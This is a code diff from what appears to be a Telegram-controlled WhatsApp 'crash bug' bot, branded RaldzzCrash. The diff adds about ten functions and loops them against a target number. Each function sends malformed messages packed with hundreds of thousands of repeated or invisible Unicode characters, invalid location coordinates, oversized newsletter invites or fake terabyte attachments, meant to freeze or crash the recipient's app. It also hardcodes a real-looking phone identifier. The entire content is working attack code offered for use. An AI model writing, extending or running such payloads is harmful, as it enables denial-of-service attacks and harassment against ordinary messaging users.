@@ -803,8 +803,8 @@ bot.command("xcsystemui", checkWhatsAppConnection, async ctx => {
   // Proses response pertama
   await prosesrespone(target, ctx);
 
-  // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 5; i++) {
+  // Melakukan proses freezing 92 kali
+  for (let i = 0; i < 3; i++) {
     await LocSystem(target);
     await f10(target, { ptcp: true });
     await QDIphone(target);
@@ -826,7 +826,17 @@ bot.command("xcsystemui", checkWhatsAppConnection, async ctx => {
     await IosMJ(target);
     await BlankScreen(target, { ptcp: true }); 
     await XiosVirus(target);
-    await systemUi(target, { ptcp: true }); 
+    await systemUi(target, { ptcp: true });
+    await freezeBeta1(target);
+    await sendxoMessage(target);
+    await freezekamoflase(target);
+    await blank(target);
+    await bugDocu(target);
+    await bugBetaDox(target);
+    await crashBeta(target);
+    await doxIP(target);
+    await lockIP(target);
+    await freezeBeta2(target);
   }
 
   // Menyelesaikan proses response
@@ -1430,6 +1440,280 @@ async function XeonXRobust(target, Ptcp = true) {
       jid: target
     }
   } : {});
+}
+
+async function freezeBeta1(target) {
+    await cella.relayMessage(target, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        locationMessage: {
+                            degreesLatitude: 0,
+                            degreesLongitude: 0
+                        },
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: "♨️ 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 ♨️" + "ꦽ".repeat(450000)
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                        groupMentions: [{ 
+                            groupJid: "1@newsletter", 
+                            groupSubject: "RALDZZ CRASH" 
+                        }]
+                    },
+                    footer: "ꦾ".repeat(2000)
+                }
+            }
+        }
+    }, { participant: { jid: target } }, { messageId: null });
+ console.log(chalk.red("Succesfully Send Bug To Target"));
+}
+
+
+async function freezeBeta2(target) {
+    await cella.relayMessage(target, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        locationMessage: {
+                            degreesLatitude: 0,
+                            degreesLongitude: 0
+                        },
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: "☠️ 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 ☠️" + "◌".repeat(450000)
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                        groupMentions: [{ 
+                            groupJid: "1@newsletter", 
+                            groupSubject: "RALDZZ CRASH" 
+                        }]
+                    },
+                    footer: "ꦾ".repeat(2000)
+                }
+            }
+        }
+    }, { participant: { jid: target } }, { messageId: null });
+ console.log(chalk.red("Succesfully Send Bug To Target"));
+ }
+
+async function sendxoMessage(target) {
+    let messageText = "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣";
+    let timestamp = Date.now();
+
+    await cella.relayMessage(target, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        locationMessage: {
+                            degreesLatitude: -999.03499999999999,
+                            degreesLongitude: 999.03499999999999
+                        },
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(250000) 
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "RALDZZ CRASH" }]
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: target } });
+  console.log(chalk.red("Succesfully Send Bug To Target"));
+}
+
+
+async function freezekamoflase(target) {
+    await cella.relayMessage(target, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        locationMessage: {
+                            degreesLatitude: 0,
+                            degreesLongitude: 0
+                        },
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣" + "ꦾ".repeat(450000)
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                        groupMentions: [{ 
+                            groupJid: "1@newsletter", 
+                            groupSubject: "RALDZZ CRASH" 
+                        }]
+                    },
+                    footer: "ꦾ".repeat(2000)
+                }
+            }
+        }
+    }, { participant: { jid: target } }, { messageId: null });
+ console.log(chalk.red("Succesfully Send Bug To Target"));
+}
+
+async function blank(target) {
+			var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
+				'viewOnceMessage': {
+					'message': {
+						"newsletterAdminInviteMessage": {
+							"newsletterJid": `120363298524333143@newsletter`,
+							"newsletterName": "📜 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 📜" + "ꦾ".repeat(350000),
+							"jpegThumbnail": "",
+							"caption": "ꦾ".repeat(350000),
+							"inviteExpiration": Date.now() + 1814400000
+						}
+					}
+				}
+			}), {
+				'userJid': target
+			});
+			await cella.relayMessage(target, messageContent.message, {
+				'participant': {
+					'jid': target
+				},
+				'messageId': messageContent.key.id
+			});
+		}
+
+
+async function bugDocu(target) {
+  try {
+    const pesan = "@0".repeat(250000);
+    const file = {
+      name: "ꦾ".repeat(250000) + ".txt",
+      size: 1099511627776, // 1TB
+      data: "0".repeat(1099511627776),
+    };
+    const message = {
+      text: pesan,
+      contextInfo: { mentionedJid: ['6285141370204@s.whatsapp.net'] },
+      attachment: file,
+    };
+    await cella.relayMessage(target, message, {
+      participant: { jid: target },
+      messageId: null,
+    });
+    console.log("Sukses mengirim pesan");
+  } catch (error) {
+    console.error("Gagal mengirim pesan:", error);
+  }
+}
+
+async function bugBetaDox(target) {
+  try {
+    const pesan = "ꦽ".repeat(350000);
+    const file = {
+      name: "ꦾ".repeat(250000) + ".txt",
+      size: 1099511627776, // 1TB
+      data: "0".repeat(1099511627776),
+    };
+    const message = {
+      text: pesan,
+      contextInfo: { mentionedJid: ['6285141370204@s.whatsapp.net'] },
+      attachment: file,
+    };
+    await cella.relayMessage(target, message, {
+      participant: { jid: target },
+      messageId: null,
+    });
+    console.log("Sukses mengirim pesan");
+  } catch (error) {
+    console.error("Gagal mengirim pesan:", error);
+  }
+}
+
+async function crashBeta(target) {
+			var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
+				'viewOnceMessage': {
+					'message': {
+						"newsletterAdminInviteMessage": {
+							"newsletterJid": `120363298524333143@newsletter`,
+							"newsletterName": "📜 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 📜" + "ꦽ".repeat(350000),
+							"jpegThumbnail": "",
+							"caption": "ꦽ".repeat(350000),
+							"inviteExpiration": Date.now() + 1814400000
+						}
+					}
+				}
+			}), {
+				'userJid': target
+			});
+			await cella.relayMessage(target, messageContent.message, {
+				'participant': {
+					'jid': target
+				},
+				'messageId': messageContent.key.id
+			});
+		}
+
+async function doxIP(target) {
+  try {
+    const pesan = "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(350000);
+    const file = {
+      name: "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(250000) + ".txt",
+      size: 1099511627776, // 1TB
+      data: "0".repeat(1099511627776),
+    };
+    const message = {
+      text: pesan,
+      contextInfo: { mentionedJid: ['6285141370204@s.whatsapp.net'] },
+      attachment: file,
+    };
+    await cella.relayMessage(target, message, {
+      participant: { jid: target },
+      messageId: null,
+    });
+    console.log("Sukses mengirim pesan");
+  } catch (error) {
+    console.error("Gagal mengirim pesan:", error);
+  }
+}
+
+async function lockIP(target) {
+    await cella.relayMessage(target, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        locationMessage: {
+                            degreesLatitude: 0,
+                            degreesLongitude: 0
+                        },
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(450000)
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                        groupMentions: [{ 
+                            groupJid: "1@newsletter", 
+                            groupSubject: "RALDZZ CRASH" 
+                        }]
+                    },
+                    footer: "ꦾ".repeat(2000)
+                }
+            }
+        }
+    }, { participant: { jid: target } }, { messageId: null });
+ console.log(chalk.red("Succesfully Send Bug To Target"));
 }
         async function thunderblast_doc(target) {
     const messagePayload = {
